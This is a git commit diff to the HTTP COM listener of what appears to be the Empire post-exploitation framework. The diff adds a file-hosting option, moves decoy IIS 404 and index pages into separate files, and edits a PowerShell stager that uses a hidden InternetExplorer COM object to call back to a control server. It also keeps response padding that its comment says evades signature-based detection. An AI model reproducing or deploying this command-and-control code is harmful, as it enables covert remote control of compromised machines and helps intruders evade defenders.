eddfc890593d927b364a72256d9760dfca1d84e3
Rahmat Nurfauzi <rahmat.nf42@gmail.com>
2018-06-06 07:27:47 +0700

    Update http_com.py

--- lib/listeners/http_com.py
+++ lib/listeners/http_com.py
@@ -110,6 +110,11 @@ class Listener:
                 'Required'      :   True,
                 'Value'         :   'CF-RAY'
             },
+             'HostPath' : {
+                'Description'   :   'Directory path for hosting files.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },              
             'Headers' : {
                 'Description'   :   'Headers for the control server.',
                 'Required'      :   True,
@@ -142,82 +147,23 @@ class Listener:
         self.header_offset = random.randint(0,64)
 
     def default_response(self):
-         """
-         Returns an IIS 7.5 404 not found page.
-         """
+        """
+        Returns an IIS 7.5 404 not found page.
+        """
 
-         return '\n'.join([
-             '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
-             '<html xmlns="http://www.w3.org/1999/xhtml">',
-             '<head>',
-             '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
-             '<title>404 - File or directory not found.</title>',
-             '<style type="text/css">',
-             '<!--',
-             'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
-             'fieldset{padding:0 15px 10px 15px;}',
-             'h1{font-size:2.4em;margin:0;color:#FFF;}',
-             'h2{font-size:1.7em;margin:0;color:#CC0000;}',
-             'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}',
-             '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
-             'background-color:#555555;}',
-             '#content{margin:0 0 0 2%;position:relative;}',
-             '.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}',
-             '-->',
-             '</style>',
-             '</head>',
-             '<body>',
-             '<div id="header"><h1>Server Error</h1></div>',
-             '<div id="content">',
-             ' <div class="content-container"><fieldset>',
-             '  <h2>404 - File or directory not found.</h2>',
-             '  <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>',
-             ' </fieldset></div>',
-             '</div>',
-             '</body>',
-             '</html>',
-             ' ' * self.header_offset,  # randomize the length of the header to evade signature based detection
-         ])
+        default_response = open("data/pages/default.html","r").read()
+        default_response +=  " " * self.header_offset
+
+        return default_response
 
     def index_page(self):
         """
         Returns a default HTTP server page.
         """
 
-        return '\n'.join([
-            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
-            '<html xmlns="http://www.w3.org/1999/xhtml">',
-            '<head>',
-            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />',
-            '<title>IIS7</title>',
-            '<style type="text/css">',
-            '<!--',
-            'body {',
-            '    color:#000000;',
-            '    background-color:#B3B3B3;',
-            '    margin:0;',
-            '}',
-            '',
-            '#container {',
-            '    margin-left:auto;',
-            '    margin-right:auto;',
-            '    text-align:center;',
-            '    }',
-            '',
-            'a img {',
-            '    border:none;',
-            '}',
-            '',
-            '-->',
-            '</style>',
-            '</head>',
-            '<body>',
-            '<div id="container">',
-            '<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>',
-            '</div>',
-            '</body>',
-            '</html>',
-        ])
+        index_page = open("data/pages/index.html","r").read()
+
+        return index_page
 
     def validate_options(self):
         """
@@ -318,7 +264,7 @@ class Listener:
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
                 stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
-                stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
+                stager += "$ser='%s';$t='%s';" % (host, stage0)
 
                 # add the RC4 packet to a header location
                 stager += "$c=\"%s: %s" % (requestHeader, b64RoutingPacket)
@@ -705,6 +651,18 @@ class Listener:
                     routingPacket = base64.b64decode(reqHeader)
                 except Exception as e:
                     routingPacket = None
+
+            # handler hosting file
+            static_dir = self.options['HostPath']['Value']
+
+            if static_dir != '':
+                # make dynamic request uri                
+                host_file = request_uri.split('/')[-1]
+                packages = static_dir + host_file
+
+                # host a packages file, will return valid file if exist
+                if os.path.isfile(packages) and os.path.exists(packages):                  
+                    return send_from_directory(static_dir, host_file)
 
             if routingPacket:
                 # parse the routing packet and process the results
